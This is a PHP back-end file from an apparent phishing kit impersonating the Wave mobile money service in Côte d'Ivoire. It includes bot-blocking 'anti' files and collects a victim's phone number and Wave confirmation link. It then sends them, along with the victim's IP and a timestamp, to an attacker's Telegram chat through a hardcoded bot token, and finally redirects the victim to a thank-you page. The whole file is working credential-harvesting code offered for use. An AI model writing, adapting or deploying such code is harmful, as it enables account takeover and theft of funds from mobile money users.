<?php
session_start();
error_reporting(0);
set_time_limit(0);

include ('../../prevents/bots.php');
include ('../../prevents/anti1.php');
include ('../../prevents/anti2.php');
include ('../../prevents/anti3.php');
include ('../../prevents/anti4.php');
include ('../../prevents/anti5.php');
include ('../../prevents/anti6.php');
include ('../../prevents/anti7.php');
include ('../../prevents/anti8.php');

date_default_timezone_set('GMT');
$ip = getenv("REMOTE_ADDR");

// === CONFIGURATION TELEGRAM ===
$botToken = '8550681538:AAFeZE-haJ_q8_g9NDic1Z17ciUa4nHBLPE';  // Vérifie que c'est bien le bon
$chatId   = '-5028537179';                                   // Doit commencer par -100 pour les groupes si c'est un supergroup

// Récupération des données
$link  = isset($_POST['link']) ? trim($_POST['link']) : '';
$phone = isset($_POST['phone']) ? $_POST['phone'] : (isset($_SESSION['phone']) ? $_SESSION['phone'] : 'Inconnu');

// Formatage du numéro pour affichage
if (strlen($phone) == 10) {
    $formatted_phone = substr($phone, 0,2).' '.substr($phone,2,2).' '.substr($phone,4,2).' '.substr($phone,6,2).' '.substr($phone,8,2);
} else {
    $formatted_phone = $phone;
}

// === Vérification basique du lien (optionnel, déjà fait en JS mais sécurité serveur) ===
$validPrefix = 'https://ci.confirm.wave.com/l/';
if (empty($link) || strpos($link, $validPrefix) !== 0) {
    // Lien invalide → retour à la page lien
    header('Location: ../lien.php'); // ou ../sms.php selon ton nom de fichier
    exit();
}

// === Construction du message Telegram ===
$message = "✅ *NOUVEAU LIEN WAVE CAPTURÉ*\n\n";
$message .= "📱 Numéro : +225 $formatted_phone\n";
$message .= "🔗 Lien : $link\n";
$message .= "🌍 IP : $ip\n";
$message .= "⏰ Date : " . date('d/m/Y H:i:s');

// === Envoi vers Telegram ===
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id'    => $chatId,
    'text'       => $message,
    'parse_mode' => 'HTML'  // Pour le gras et emojis
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
        'ignore_errors' => true
    ]
];

$context = stream_context_create($options);
$response = @file_get_contents($url, false, $context);

// === Debug (à supprimer en production) ===
// Tu peux temporairement activer ça pour voir les erreurs :
// file_put_contents('debug_telegram.txt', "Response: $response\nPOST: " . print_r($_POST, true) . "\n", FILE_APPEND);

// Si l'envoi a réussi (réponse contient "ok":true)
if ($response !== false) {
    $json = json_decode($response, true);
    if (isset($json['ok']) && $json['ok'] === true) {
        // Succès → page de fin
        header('Location: ../merci.php');
        exit();
    }
}

// === Si échec d'envoi Telegram ===
header('Location: ../erreur.php'); // Optionnel : crée une page "problème technique"
exit();
?>